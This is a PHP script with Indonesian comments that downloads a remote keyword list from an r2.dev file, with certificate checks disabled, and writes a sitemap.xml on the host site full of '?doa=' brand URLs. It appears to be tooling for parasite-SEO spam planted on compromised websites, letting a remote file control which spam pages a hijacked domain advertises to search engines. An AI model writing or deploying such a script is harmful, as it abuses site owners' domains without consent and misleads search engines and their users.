<?php
// Deteksi domain dan path secara otomatis
$domain = "https://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . "/?doa=";

// Inisialisasi cURL untuk mengambil daftar URL dari file yang terletak di gudangcheat
$url = 'https://pub-05ba3407903e4840a55b8c21fc682cda.r2.dev/agency.txt';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Jika URL menggunakan HTTPS
$data = curl_exec($ch);
curl_close($ch);

// Pastikan data berhasil diambil dan ubah menjadi array
if ($data !== false) {
    $urlList = explode("\n", trim($data));
    $urlList = array_filter($urlList); // Hapus baris kosong dari array
} else {
    $urlList = [];
    echo "Gagal mendapatkan konten dari URL.";
}

// Buat XML untuk sitemap
$dom = new DOMDocument('1.0', 'UTF-8');
$urlset = $dom->createElement('urlset');
$urlset->setAttribute('xmlns', 'http://www.sitemaps.org/schemas/sitemap/0.9');
$dom->appendChild($urlset);

foreach ($urlList as $url) {
    $urlElement = $dom->createElement('url');
    
    // Gabungkan domain dengan URL dari daftar untuk menciptakan URL dengan parameter ?doa=brand
    $loc = $dom->createElement('loc', htmlspecialchars($domain . $url));
    $urlElement->appendChild($loc);
    
    $urlset->appendChild($urlElement);
}

// Simpan sitemap ke file langsung sebagai sitemap.xml
$dom->formatOutput = true;
$dom->save('sitemap.xml');

echo "Sitemap berhasil dibuat dan disimpan sebagai sitemap.xml!";
?>